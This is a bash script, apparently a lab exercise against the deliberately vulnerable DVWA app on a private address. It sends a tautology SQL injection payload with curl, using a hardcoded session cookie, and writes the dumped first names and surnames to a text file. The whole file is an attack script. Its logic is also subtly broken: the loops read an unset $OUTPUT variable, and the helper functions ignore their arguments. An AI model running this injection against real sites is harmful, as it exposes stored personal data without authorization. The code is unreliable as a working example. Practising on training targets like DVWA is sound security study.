#!/bin/bash

# Run the curl command and store the output in a variable.
# The curl command will have the payload included in request and the putput will be the reponse in HTML but grep'ed with only the returned content
# In the out
output=$(curl -s 'http://192.168.132.129/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit#' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate' -H 'Connection: keep-alive' -H 'Referer: http://192.168.132.129/dvwa/vulnerabilities/sqli/' -H 'Cookie: security=low; PHPSESSID=010978f9b2f10786272a6834cf7dd7ce' -H 'Upgrade-Insecure-Requests: 1' | grep pre)

get_first_name() {
    echo "$output" | grep -o "First name: [^<]*" | sed -e "s/First name: //"
}

# Define a function to extract the surname from a string
get_surname() {
    echo "$output" | grep -o "Surname: [^<]*" | sed -e "s/Surname: //"
}

echo "First Name" > output.txt

# Loop through each line of the output and extract the first name and surname
while read -r line; do
    first_name=$(get_first_name "$line")

    # Output the first name and surname to a text file with two columns
    echo "$first_name" >> output.txt
done <<< "$(echo -e "$OUTPUT")"

echo "" >> output.txt
echo "Surname" >> output.txt
while read -r line; do
        surname=$(get_surname "$line")
        echo "$surname" >> output.txt

done <<< "$(echo -e "$OUTPUT")"
cat output.txt
